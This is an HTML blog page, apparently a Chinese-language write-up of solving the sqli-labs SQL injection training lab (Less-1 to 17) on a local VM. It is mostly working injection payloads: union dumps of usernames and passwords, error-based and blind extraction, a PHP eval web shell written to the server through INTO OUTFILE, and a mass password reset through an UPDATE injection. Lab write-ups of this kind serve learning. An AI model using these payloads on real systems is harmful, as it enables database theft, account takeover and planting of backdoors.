@@ -1,0 +1,1148 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      sqli-labs Basic Challenges | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「sqli-labs Basic Challenges」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2021/12/15/sqli-labs-Basic-Challenges/" itemprop="url">
+		sqli-labs Basic Challenges
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2021/12/15/sqli-labs-Basic-Challenges/" itemprop="url">
+		<time datetime="2021-12-15T12:56:41.000Z" itemprop="dateUpdated">
+	  		2021-12-15
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/Web/" class=" ">
+			Web
+		</a>
+	
+		<a href="/tags/SQLi/" class=" ">
+			SQLi
+		</a>
+	
+		<a href="/tags/Web%E9%9D%B6%E5%9C%BA/" class=" ">
+			Web靶场
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="NOTE-sqli-labs-Basic-Challenges"><a href="#NOTE-sqli-labs-Basic-Challenges" class="headerlink" title="[NOTE] sqli-labs Basic Challenges"></a>[NOTE] sqli-labs Basic Challenges</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>针对sqli-labs靶场的做题笔记</p>
+<p><strong>环境</strong><br>虚拟机环境<br>攻击机：kali 10.10.10.1<br>靶机：ubuntu 10.10.10.2 小皮面板搭建Web服务</p>
+<h2 id="Less-1-GET-Error-based-Single-quotes–String"><a href="#Less-1-GET-Error-based-Single-quotes–String" class="headerlink" title="Less-1: GET-Error based-Single quotes–String"></a>Less-1: GET-Error based-Single quotes–String</h2><p>提示输入数字参数id<br>正常输入<code>1</code>，我是个dumb<br>输入<code>&#39;</code>，报错了，顺便知道用了limit 0,1限制输出<br>输入<code>?id=&#39; or &#39;1&#39;=&#39;1</code>，回显dumb，字符型注入<br><code>?id=1&#39; order by 3 %23</code>，得出字段数为3<br><code>?id=&#39; union select 1,2,3 %23</code>，得到回显第2、3个字段：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021174518269.png" alt="在这里插入图片描述"></p>
+<p>然后就可以对第2、3个字段进行修改，提取我们感兴趣的信息</p>
+<p><code>?id=’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</code><br>提取当前数据库中的所有表名</p>
+<p><code>?id=&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; %23</code><br>提取users表中的所有字段名</p>
+<p><code>?id=&#39; union select 1,group_concat(username),group_concat(password) from users %23</code><br>提取users表中的所有用户名和对应的密码</p>
+<h2 id="Less-2-GET-Error-based-Intiger-based"><a href="#Less-2-GET-Error-based-Intiger-based" class="headerlink" title="Less-2: GET-Error based-Intiger based"></a>Less-2: GET-Error based-Intiger based</h2><p>和Less-1差不多，只是换成了数字型注入<br>信息获取把id对应的参数换成不存在的即可</p>
+<h2 id="Less-3-GET-Error-based-Single-quotes-with-twist-String"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-String" class="headerlink" title="Less-3: GET-Error based-Single quotes with twist-String"></a>Less-3: GET-Error based-Single quotes with twist-String</h2><p>正常输入<code>?id=1</code>，没啥<br>输入<code>?id=’</code>，报这种错：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021174846954.png" alt="在这里插入图片描述"></p>
+<p>猜测查询结构类似为where id &#x3D; (‘    <em>$XXX</em>    ’)<br>输入<code>?id=’) or 1=1 %23</code>验证，发现也回显正常了<br><code>?id=&#39;) order by 4 %23</code>报错，得回显字段数为3<br><code>?id=&#39;) union select 1,2,3 %23</code><br>下面略</p>
+<h2 id="Less-4-GET-Error-based-Double-Quotes-String"><a href="#Less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="Less-4: GET-Error based-Double Quotes-String"></a>Less-4: GET-Error based-Double Quotes-String</h2><p>常规测试<br><code>/?id=&#39;</code>，什么都没报错<br><code>/?id=&quot;</code>，报错如下：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021175018601.png" alt="在这里插入图片描述"></p>
+<p><code>/?id=” or 1=1 %23</code>，报错如下：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021175033780.png" alt="在这里插入图片描述"></p>
+<p>&#x2F;?id&#x3D;”) or 1&#x3D;1 %23，正常回显<br>猜测查询结构类似为where id &#x3D; (“    $XXX    ”)</p>
+<p><code>?id=&quot;) order by 4 %23</code></p>
+<p><code>?id=&quot;) union select 1,2,3 %23</code></p>
+<p><code>?id=&quot;) union select 1,database(),3 %23</code></p>
+<p><code>?id=&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</code></p>
+<p><code>?id=&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code></p>
+<p><code>?id=&quot;) union select 1,group_concat(username),group_concat(password) from users %23</code></p>
+<h2 id="Less-5-GET-Double-Injection-Single-Quotes-String"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="Less-5: GET-Double Injection-Single Quotes-String"></a>Less-5: GET-Double Injection-Single Quotes-String</h2><p>常规测试<br><code>?id=1</code>，显示“you are in”<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021175326026.png" alt="在这里插入图片描述"></p>
+<p><code>?id=99</code>，啥也没显示<br><code>?id=’</code><br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021175402155.png" alt="在这里插入图片描述"></p>
+<p><code>?id=’ or ‘1’=’1</code><br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021175412452.png" alt="在这里插入图片描述"></p>
+<p>好像和之前的也没啥区别？继续<code>?id=1’ order by 3 %23</code>，回显了：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021175443088.png" alt="在这里插入图片描述"></p>
+<p>？，继续尝试，得到返回字段数为3，进一步<code>?id=&#39; union select 1,2,3 %23</code>：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021175509366.png" alt="在这里插入图片描述"></p>
+<p>继续<code>?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</code></p>
+<p>继续<code>?id=&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; %23</code></p>
+<p>继续<code>?id=&#39; union select 1,group_concat(username),group_concat(password) from users %23</code></p>
+<p>搞定了，What‘s the differences？？</p>
+<p>上网了解double injection，原来是<strong>双查询注入</strong><br>重新尝试<br><code>?id=1&#39; union select 1, concat((select database()), floor(rand(14)*2)) as c, count(*) from information_schema.tables group by c %23</code><br>报错啊啊啊啊啊啊啊<br>首先是说什么两个数据库的字符集不同，然后又说什么<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021175600687.png" alt="在这里插入图片描述"></p>
+<p>麻了，看多几遍这两个文章当会了得了：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/wn314/article/details/89297560">MySQL中Double Injection原理浅析</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/786aa540a900?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">sqli-labs level5-6 双查询注入</a></p>
+<h2 id="Less-6-GET-Double-Injection-Double-Quotes-String"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="Less-6: GET-Double Injection-Double Quotes-String"></a>Less-6: GET-Double Injection-Double Quotes-String</h2><p>呃，听说和Less-5一样，只是单引号变成了双引号</p>
+<h2 id="Less-7-GET-Dump-into-outfile-String"><a href="#Less-7-GET-Dump-into-outfile-String" class="headerlink" title="Less-7: GET-Dump into outfile-String"></a>Less-7: GET-Dump into outfile-String</h2><p><code>/?id=1</code><br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021182637081.png" alt="在这里插入图片描述"></p>
+<p>outfile？啥？<br><code>?id=‘</code><br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021182718027.png" alt="在这里插入图片描述"></p>
+<p>详细报错也没了<br><del>然后发现不管是单双引号加上括号都不好使了</del><br><strong>（其实是要让前面为真，然后才跟or)</strong><br><code>/?id=1</code>、<code>/?id=1’</code>、<code>/?id=1”</code><br>一三可以，二不行，字符型注入（测试不够全面)<br>尝试<code>/?id=1” order by 9 %23</code>，发现也能显示you are in，不对劲<br>原来存在括号，而且是单引号包起来的变量，需要探测出来<br><code>/?id=1’))</code>，显示you are in<br>order by探测字段数：<code>?id=1&#39;)) order by 3 %23</code><br><code>?id=&#39;)) union select 1,2,3 %23</code>，发现也只是显示you are in，看来是不会在页面显示信息了</p>
+<p>于是百度dump into outfile<br>MySQL的outfile函数用于将查询结果写入到服务器文件中<br>因为涉及到在服务器上写入文件，所以上述函数能否成功执行受到参数secure_file_priv 的影响<br>然后到靶机中的my.cnf配置中新增了<code>secure_file_priv=</code><br>这样就可以不限制上传位置了</p>
+<p><code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt;&#39; into outfile &#39;/www/sqli-labs-master/shell.php&#39; %23</code><br>虽然还是会显示有语法错误，但是实际上已经上传文件了（前提是要有对目标文件夹的写入权限（一般&#x2F;tmp&#x2F;会有，这里我临时改了&#x2F;www&#x2F;的权限））<br>然后蚁剑链接，只获得了&#x2F;www&#x2F;sqli-labs-master&#x2F;的权限</p>
+<h2 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="Less-8: GET-Blind-Boolian Based-Single Quotes"></a>Less-8: GET-Blind-Boolian Based-Single Quotes</h2><p>基于布尔的盲注<br><code>/?id=1</code>行、<code>/?id=1‘</code>不行、<code>/?id=1”</code>行——字符型单引号注入<br><code>/?id=1&#39; order by 4 %23</code>判断字段数为3<br><code>?id=&#39; union select 1,2,3 %23</code>发现也只是显示you are in，盲注</p>
+<ol>
+<li><p>猜解当前数据库名长度<br><code>/?id=&#39; or (length(database())=8) %23</code></p>
+</li>
+<li><p>猜解数据库名</p>
+<ol>
+<li><p>第一个字符<br><code>/?id=&#39; or (ascii(substr(database(),1,1))&lt;=90) %23</code>不对<br><code>/?id=&#39; or (ascii(substr(database(),1,1))&lt;=122) %23</code>对<br>说明第一个字符为小写字母（则很有可能全部字符都是小写字母）<br>二分法猜字母<br><code>/?id=&#39; or (ascii(substr(database(),1,1))&lt;=109) %23</code>不对<br><code>/?id=&#39; or (ascii(substr(database(),1,1))&lt;=115) %23</code>对<br><code>/?id=&#39; or (ascii(substr(database(),1,1))&lt;=112) %23</code>不对<br>字符为113-115，逐个试<br><code>/?id=&#39; or (ascii(substr(database(),1,1))=115) %23</code>对<br>第一个字符为‘s‘</p>
+</li>
+<li><p>第二个字符<br>基于第一个字符的经验，猜测为小写字母<br><code>/?id=&#39; or (ascii(substr(database(),2,1))&lt;=109) %23</code>对<br><code>/?id=&#39; or (ascii(substr(database(),2,1))&lt;=103) %23</code>对<br><code>/?id=&#39; or (ascii(substr(database(),2,1))&lt;=100) %23</code>不对<br>字符为101-103，逐个试<br><code>/?id=&#39; or (ascii(substr(database(),2,1))=101) %23</code>对<br>第二个字符为‘e‘</p>
+</li>
+<li><p>逐步猜解出数据库名为’security’<br>验证，<code>/?id=&#39; or (database()=&#39;security&#39;) %23</code>对</p>
+</li>
+</ol>
+</li>
+<li><p>猜解数据库中表的数量<br><code>/?id=&#39; or ((select count(table_name) from information_schema.tables where table_schema=database())=3) %23</code>不对<br><code>/?id=&#39; or ((select count(table_name) from information_schema.tables where table_schema=database())=4) %23</code>对<br>说明当前数据库中表的数量为4<br>（其实不用猜数据库名？）</p>
+</li>
+<li><p>猜解数据库中表名的长度</p>
+<ol>
+<li>第一个表名长度<br><code>/?id=&#39; or (length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1))=5) %23</code>不对<br><code>/?id=&#39; or (length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1))=6) %23</code>对<br>说明第一个表名的长度为6</li>
+<li>第二个表名长度<br><code>/?id=&#39; or (length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1), 1))=7) %23</code>不对<br><code>/?id=&#39; or (length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1), 1))=8) %23</code>对<br>说明第二个表名的长度为8</li>
+<li>逐步猜解出四个表的表名长度依次为6、8、7、5（适当使用二分法）</li>
+</ol>
+</li>
+<li><p>猜解数据库中的表名</p>
+<ol>
+<li>第一个表名<br>猜表名很可能和数据库名一样是全小写<br><code>/?id=&#39; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;=109) %23</code>对<br><code>/?id=&#39; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;=103) %23</code>对<br><code>/?id=&#39; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;=100) %23</code>错<br>字符为101-103，逐个试<br><code>/?id=&#39; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101) %23</code>对<br>第一个字符为‘e‘<br><code>/?id=&#39; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109) %23</code>对<br>第二个字符为‘m‘<br>逐步猜出第一个表名为‘emails‘<br>或者猜出前两三个字符，配合长度为5，可以直接猜是‘emails‘<br>验证，<code>/?id=&#39; or ((select table_name from information_schema.tables where table_schema=database() limit 0,1)=&#39;emails&#39;) %23</code>对</li>
+<li>第二个表名<br><code>/?id=&#39; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114) %23</code>对<br>第一个字符为‘r’<br><code>/?id=&#39; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=101) %23</code>对<br>第二个字符为‘e’<br>逐步猜出第二个表名为‘referers’</li>
+<li>第三个表名为‘uagents’</li>
+<li>第四个表名为‘users’</li>
+</ol>
+</li>
+<li><p>猜解users表的字段数<br><code>?id=&#39; or ((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)=3) %23</code>对<br>users有3个字段</p>
+</li>
+<li><p>猜解users表每个字段名的长度<br><code>/?id=&#39; or ((length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),1)))=2) %23</code>对<br>第一个字段名长2<br><code>/?id=&#39; or ((length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1),1)))=8) %23</code>对<br>第二个字段名长8<br>逐步猜解三个字段名依次长2、8、8</p>
+</li>
+<li><p>猜解users表的每个字段名</p>
+<ol>
+<li>第一个字段名<br><code>/?id=&#39; or (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),1,1))=105) %23</code>对<br>第一个字符为‘i’<br>完整名字是‘id’</li>
+<li>第二个字段名<br><code>/?id=&#39; or (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1),1,1))=112) %23</code>对<br>第一个字符为‘p’<br>第二个字符为‘a’<br>结合长度为8，表名为‘users’，猜测为‘password’<br>验证，<code>/?id=&#39; or ((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1)=&#39;password&#39;) %23</code>对</li>
+<li>第三个字段名为‘username’</li>
+</ol>
+</li>
+<li><p>猜解username字段中值的数量<br><code>/?id=&#39; or ((select count(username) from users)=13) %23</code>对<br>有13个用户</p>
+</li>
+<li><p>猜解最后一个用户名的长度<br><code>/?id=&#39; or (length(substr((select username from users limit 12,1),1))=6) %23</code>对<br>最后一个用户名长6</p>
+</li>
+<li><p>猜解最后一个用户名<br>这里需要注意的是，不要默认是全小写了，因为是用户名，首字母大写或者是数字或者是别的情况都有可能<br><code>/?id=&#39; or ((ascii(substr((select username from users limit 12,1),1,1)))=97) %23</code>对<br>第一个字符为‘a’<br><code>/?id=&#39; or ((ascii(substr((select username from users limit 12,1),2,1)))=100) %23</code>对<br>第二个字符为‘d’<br>第三个字符为‘m’<br>第四个字符为‘i’<br>第五个字符为‘n’<br><code>/?id=&#39; or ((ascii(substr((select username from users limit 12,1),6,1)))=52) %23</code><br>第六个字符为‘4’<br>最后一个用户名为‘admin4’</p>
+</li>
+<li><p>最后给出一些直接猜测常用表名、字段名的方法</p>
+<ol>
+<li><p>直接猜表名<br><code>/?id=&#39; or ((select count(*) from information_schema.tables where table_name=&#39;users&#39; and table_schema=database())=1) %23</code>对<br>当前数据库中存在users表</p>
+</li>
+<li><p>直接猜字段名<br><code>/?id=&#39; or ((select count(*) from information_schema.columns where column_name=&#39;username&#39; and table_name=&#39;users&#39;)=1) %23</code><br>users表中存在username字段</p>
+</li>
+<li><p>直接猜字段值<br><code>/?id=&#39; or ((select count(*) from users where username=&#39;admin&#39;)=1) %23</code><br>users表中存在admin用户</p>
+</li>
+</ol>
+</li>
+</ol>
+<hr>
+<p>手工注入真丁8累，跑跑sqlmap爽一下<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021183849553.png" alt="在这里插入图片描述"></p>
+<p>爽中爽！！！</p>
+<h2 id="Less-9-GET-Blind-Time-based-Single-Quotes"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes" class="headerlink" title="Less-9: GET-Blind-Time based-Single Quotes"></a>Less-9: GET-Blind-Time based-Single Quotes</h2><p>基于时间的盲注，完全不会，先去学习一波<br>原来，这时候的页面无论给id传什么值，是对是错都会显示you are in（就等于没有任何回显信息），这时候只能通过时间延迟来判断有没有注入点<br>首先是if(condition,A,B)语句，若condition成立，则返回A，否则返回B</p>
+<p>（下面的延时时间由于个人问题设的很小，实际效果也会延时挺久的）<br>首先是判断注入类型：<br><code>/?id=&#39; or if(1=1,sleep(1),0) %23</code>：回应有延时<br><code>/?id=&quot; or if(1=1,sleep(1),0) %23</code>：回应很快<br><code>/?id= or if(1=1,sleep(1),0) %23</code>：回应很快<br>说明是字符型注入，单引号<br>然后剩下的就和布尔盲注类似，只不过判断条件放到了if语句中，成立则延时</p>
+<ol>
+<li>判断数据库名长度<br><code>/?id=&#39; or if((length(database())=7),sleep(1),0) %23</code>，回应很快<br><code>/?id=&#39; or if((length(database())=8),sleep(1),0) %23</code>，有延时<br>说明数据库名长度为8个字符</li>
+<li>判断数据库名第一个字符<br><code>/?id=&#39; or if((ascii(substr(database(),1,1))=115),0,sleep(0.5)) %23</code>，回应很快<br>说明第一个字符为‘s‘</li>
+</ol>
+<p>下略</p>
+<p>另外关于是对是错，什么时候延时不要限得太死，例如二分法时让错的延时，尽量让容易出现的情况延时就好</p>
+<h2 id="Less-10-GET-Blind-Time-based-double-quotes"><a href="#Less-10-GET-Blind-Time-based-double-quotes" class="headerlink" title="Less-10: GET-Blind-Time based-double quotes"></a>Less-10: GET-Blind-Time based-double quotes</h2><p>与Less-9类似，也是字符型时间盲注，只不过是双引号<br>最后用sqlmap跑跑盲注<br>很奇怪，Less-9可以跑，Less-10却不行</p>
+<h2 id="Less-11-POST-Error-Based-Single-quotes-String"><a href="#Less-11-POST-Error-Based-Single-quotes-String" class="headerlink" title="Less-11: POST-Error Based-Single quotes-String"></a>Less-11: POST-Error Based-Single quotes-String</h2><p>POST型，变成了账号密码登录页面<br>乱输，我fail了<br>输入‘会显示报错信息：<br><em>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ and password&#x3D;’’ LIMIT 0,1’ at line 1</em></p>
+<p>两个都输<code>1&#39; or 1=1 #</code>，登进去了，显示用户名和密码都是dumb<br>字符型单引号布尔注入</p>
+<p>发现一个问题，username和password在SQL语句中的判定顺序需要确定一下<br>例如：<br><em>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘union select 1,2 #’ and password&#x3D;’’ or union select 1,2 #’ LIMIT 0,1’ at line 1</em><br>是先检查username的，所以。。。。应该把注入回显放在password字段<br>哦，也不是，直接注第一个字段就行，我是傻逼</p>
+<p>注POST一定要整个能够Repeat的，像是BP、控制台啥的，不然累死<br>针对第一个字段的注入结果:</p>
+<p><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021184245870.png" alt="在这里插入图片描述"></p>
+<p><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021184250095.png" alt="在这里插入图片描述"></p>
+<h2 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="Less-12: POST-Error Based-Double quotes-String-with twist"></a>Less-12: POST-Error Based-Double quotes-String-with twist</h2><p>仅在用户名字段输入“，报错：<br><em>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“””) and password&#x3D;(“”) LIMIT 0,1’ at line 1</em><br>看来还有括号<br><code>uname=&quot;) or 1=1 #&amp;passwd=&amp;submit=Submit</code><br>完事啦：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021184346902.png" alt="在这里插入图片描述"></p>
+<p>剩下常规注入即可。。。</p>
+<h2 id="Less-13-POST-Double-Injection-Single-quotes-String-with-twist"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-with-twist" class="headerlink" title="Less-13: POST-Double Injection-Single quotes-String-with twist"></a>Less-13: POST-Double Injection-Single quotes-String-with twist</h2><p><code>uname=&#39;&amp;passwd=&amp;submit=Submit</code>，报错:<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021184516219.png" alt="在这里插入图片描述"></p>
+<p>单引号+括号<br><code>uname=&#39;) or 1=1 #&amp;passwd=&amp;submit=Submit</code>，不对劲：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021184538988.png" alt="在这里插入图片描述"></p>
+<p>没有具体字段的回显，只显示了正确<br>这就盲注了？麻了</p>
+<p>哦哦，不是，是double injection，我是傻逼</p>
+<p>总结一下双重注入的适用场景：正确输入无信息，结构错误输入会报错<br>尝试<a target="_blank" rel="noopener" href="https://blog.csdn.net/wn314/article/details/89297560">上面双重注入提到的文章的方法</a><br>发现还是会有字符集的错误，吐了</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bt517840374/article/details/80724889">关于这题的博文</a></p>
+<h2 id="Less-14-POST-Double-Injection-Single-quotes-String-with-twist"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-with-twist" class="headerlink" title="Less-14: POST-Double Injection-Single quotes-String-with twist"></a>Less-14: POST-Double Injection-Single quotes-String-with twist</h2><p>同上，单引号换双引号</p>
+<h2 id="Less-15-POST-Blind-Boolian-time-Based-Single-quotes"><a href="#Less-15-POST-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="Less-15: POST-Blind-Boolian&#x2F;time Based-Single quotes"></a>Less-15: POST-Blind-Boolian&#x2F;time Based-Single quotes</h2><p>盲注，只有成功、失败&#x2F;语法错误两种信息，且没有报错提示<br>判断出字符型单引号盲注<br>看一遍上面讲过的流程，然后sqlmap</p>
+<h2 id="Less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><a href="#Less-16-POST-Blind-Boolian-Time-Based-Double-quotes" class="headerlink" title="Less-16: POST-Blind-Boolian&#x2F;Time Based-Double quotes"></a>Less-16: POST-Blind-Boolian&#x2F;Time Based-Double quotes</h2><p>同上，单引号变成了双引号+括号<br>sqlmap跑不出？<br>试试–level 5 –risk 3最高级别探测——成啦</p>
+<h2 id="Less-17-POST-Update-Query-Error-Based-String"><a href="#Less-17-POST-Update-Query-Error-Based-String" class="headerlink" title="Less-17: POST-Update Query-Error Based-String"></a>Less-17: POST-Update Query-Error Based-String</h2><p>啥玩意，更新注入？<br>页面变成了输入了“用户名”和“新密码”，改密码的意思吗？<br>而且还有个“[PASSWORD RESET]”字段显示<br>先试试常规注入，随便输个双一，被骂了5555555<br>然后试试用户名admin，密码栾树，成功了，说明admin用户存在，还被我们改了密码？<br>登入到网站后台，发现密码还真被改了<br>那么怎么脱裤呢？</p>
+<p>这是MySQL的更新语句，猜测应该是类似于下面这种：<br>UPDATE table SET pwd&#x3D;’$XX’ WHERE username&#x3D;’$XXX’;<br>那我是不是可以产生设置pwd之后注释掉后面的语句，把所有用户的密码都改成我想要的？<br>试试输入用户名admin，新密码输入123’ #<br>登入后台，发现还真全被改了：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021184816307.png" alt="在这里插入图片描述"></p>
+<p>这种漏洞应该可以用在“找回密码-&gt;设置新密码”这种地方</p>
+<p>所以怎么脱裤。。。。冲浪去了<br>原来uname字段作足了过滤，无法注入（可能是为了保证更改密码流程的执行）<br>只能在passwd字段作注入，可以使用<strong>双重注入</strong>或<strong>updatexml()注入</strong><br><code>passwd=&#39;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#</code><br>下面的就常规进行</p>
+<h3 id="updatexml-注入"><a href="#updatexml-注入" class="headerlink" title="updatexml()注入"></a>updatexml()注入</h3><p>是SQL语法中的函数<br><code>UPDATEXML(XML_document, XPath_string, new_value)</code></p>
+<p>参数：</p>
+<ol>
+<li>XML_document是String格式，为XML文档对象的名称，文中为Doc</li>
+<li>XPath_string (Xpath格式的字符串) ，用于匹配第一个参数中的部分内容。（就像使用正则表达式匹配一个文本的特定内容一样）</li>
+<li>new_value，String格式，替换查找到的符合条件的数据。</li>
+</ol>
